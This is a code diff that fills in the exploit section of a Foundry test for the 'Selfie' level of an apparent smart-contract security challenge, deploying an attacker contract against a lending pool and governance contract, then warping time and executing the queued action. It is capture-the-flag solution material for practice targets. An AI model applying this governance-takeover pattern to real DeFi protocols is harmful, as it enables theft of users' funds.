@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {AttackerContract} from "../../../src/Contracts/selfie/solution/AttackerContract.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,7 +48,15 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        AttackerContract attackerContract = new AttackerContract(
+            address(selfiePool),
+            address(simpleGovernance)
+        );
+        attackerContract.attack();
+        vm.warp(5 days);
+        attackerContract.executeAction();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
